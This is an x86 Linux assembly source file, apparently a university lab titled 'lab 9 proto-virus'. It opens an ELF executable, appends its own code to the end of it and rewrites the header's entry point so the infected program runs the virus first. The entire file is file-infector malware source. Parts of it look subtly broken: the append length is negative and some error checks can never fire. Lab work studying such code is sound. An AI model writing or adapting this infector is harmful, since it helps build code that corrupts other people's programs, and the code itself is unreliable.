%macro	syscall1 2
	mov	ebx, %2
	mov	eax, %1
	int	0x80
%endmacro

%macro	syscall3 4
	mov	edx, %4
	mov	ecx, %3
	mov	ebx, %2
	mov	eax, %1
	int	0x80
%endmacro

%macro  exit 1
	syscall1 1, %1
%endmacro

%macro  write 3
	syscall3 4, %1, %2, %3
%endmacro

%macro  read 3
	syscall3 3, %1, %2, %3
%endmacro

%macro  open 3
	syscall3 5, %1, %2, %3
%endmacro

%macro  lseek 3
	syscall3 19, %1, %2, %3
%endmacro

%macro  close 1
	syscall1 6, %1
%endmacro

%macro debug 0
	write stdout, msg ,5
%endmacro

%define	STK_RES	200
%define	RDWR	2
%define	SEEK_END 2
%define SEEK_SET 0

%define ENTRY_POINT_OFFSET		24
%define PHDR_start	28
%define	PHDR_size	32
%define PHDR_memsize	20	
%define PHDR_filesize	16
%define	PHDR_offset	4
%define	PHDR_vaddr	8

%define stdout 1

	global _start

	section .text

virus_start:

get_my_loc:
	call next_i
next_i:
	pop dword[ebp-16]			;ebp-16= next_i addr
	ret

_start:	 	

	push	ebp
	mov	ebp, esp
	sub	esp, STK_RES            ; Set up ebp and reserve space on the stack for local storage

; You code for this lab goes here
	call get_my_loc
prompt_Outstr:
	mov eax, dword[ebp-16]			;get my loc  
	sub eax, (next_i-OutStr)		;get OutStr loc	
	write stdout, eax, 31			;print OutStr
open_file:
	mov eax, dword[ebp-16]			;get my loc 
	sub eax, (next_i-FileName )		;get FileName
	open eax, RDWR, 511				;open file 
check_if_open:
	cmp eax, 0
	jb failure
open_succeeded:
	mov dword[ebp-4], eax				; fd = [ebp -4]
check_if_elf:
	lea ebx, [ebp-8]					;ebp-8 = first 4 bytes of the file 
	read eax, ebx, 4					;read .ELF
	cmp dword[ebp-8], 0x464c457f 		;ebx=.ELF?		
	jne failure
get_file_length:
	mov eax, dword[ebp-4]				;get fd
	lseek eax,0,SEEK_END				;repositions the file offset
	mov dword[ebp-12], eax 				;ebp-12 = length of the file 
append_virus_to_EOF:
	mov eax, dword[ebp-4]				;eax=fd
	mov ebx, dword[ebp-16]				;get my loc 	
	sub ebx, (next_i-virus_start)		;ebx = &virus_start
	write eax , ebx , (virus_start-virus_end)	;write to fd code from virus_start til virus_end
copy_ELF_header_into_memory:
	mov eax, dword[ebp-4]				;get fd
	lseek eax,0,SEEK_SET				;repositions the file offset			
	mov eax, dword[ebp-4]				;eax=fd
	lea ebx, [ebp-72]					;we will copy to [ebp-20] the header		
	read eax, ebx, 52					
	cmp eax, 52 						;check if header was completly loaded			
	jne failure
modify_entry:
	lea eax, [ebp-72]					;get the starting point of memory loaded
	add eax, ENTRY_POINT_OFFSET			;location of entry point
	mov ecx, 0x08048000					;addr on virtual memory
	add ecx, dword[ebp-12]				;length of file 
	add ecx, (virus_start -_start )		;offset of _start
	mov dword[eax], ecx					;set new entry point
write_back_header_into_elf:
	mov eax, dword[ebp-4]				;get fd
	lseek eax,0,SEEK_SET				;repositions the file offset	
	mov eax, dword[ebp-4]				;eax=fd
	lea ebx, [ebp-72]					;ebp-20 = addr to header in memory 			
	write eax, ebx ,52 					;rewrite header
	cmp eax, 52 								
	jne failure
close_file:
	mov eax, dword[ebp-4]				;get fd
	close eax
	cmp eax, 0
	jb failure

VirusExit:
       exit 0            ; Termination if all is OK and no previous code to jump to
                         ; (also an example for use of above macros)

failure:
	mov eax, dword[ebp-16]
	sub eax, (next_i-Failstr)
	write stdout, eax, 12
	exit 1

FileName:	db "ELFexec", 0
OutStr:		db "The lab 9 proto-virus strikes!", 10, 0
Failstr:        db "perhaps not", 10 , 0
	
msg: db "****",10,0

PreviousEntryPoint: dd VirusExit
virus_end:



